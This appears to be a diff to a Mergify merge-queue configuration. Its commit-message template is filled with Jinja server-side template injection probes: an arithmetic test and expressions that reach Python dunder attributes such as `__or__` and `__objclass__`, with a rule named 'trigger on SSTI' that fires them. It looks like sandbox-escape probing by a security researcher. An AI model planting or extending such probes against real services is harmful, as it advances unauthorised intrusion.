@@ -1,19 +1,17 @@
 queue_rules:
   - name: default
-    queue_conditions: []
+    queue_conditions:
+      - base=master
     merge_conditions: []
     merge_method: squash
     commit_message_template: |
-      T1_OR: {{ [dict]|map(attribute="__or__")|list }}
-      T2_ROR: {{ [dict]|map(attribute="__ror__")|list }}
-      T3_IOR: {{ [dict]|map(attribute="__ior__")|list }}
-      T4_OBJCL: {{ [dict]|map(attribute="__or__")|map(attribute="__objclass__")|list }}
-      T5_FMT_OR: {{ '{0.__or__}'.format(dict) }}
-      T6_FMT_ROR: {{ '{0.__ror__}'.format(dict) }}
-      T7_FMT_IOR: {{ '{0.__ior__}'.format(dict) }}
+      SSTI: {{ 7*7 }}
+      MAP_OR: {{ [dict]|map(attribute="__or__")|list }}
+      FMT_OR: {{ '{0.__or__}'.format(dict) }}
 pull_request_rules:
-  - name: queue trigger
-    conditions: []
+  - name: trigger on SSTI
+    conditions:
+      - base=master
     actions:
       comment:
-        message: queue this
+        message: "Queue checkbox available"
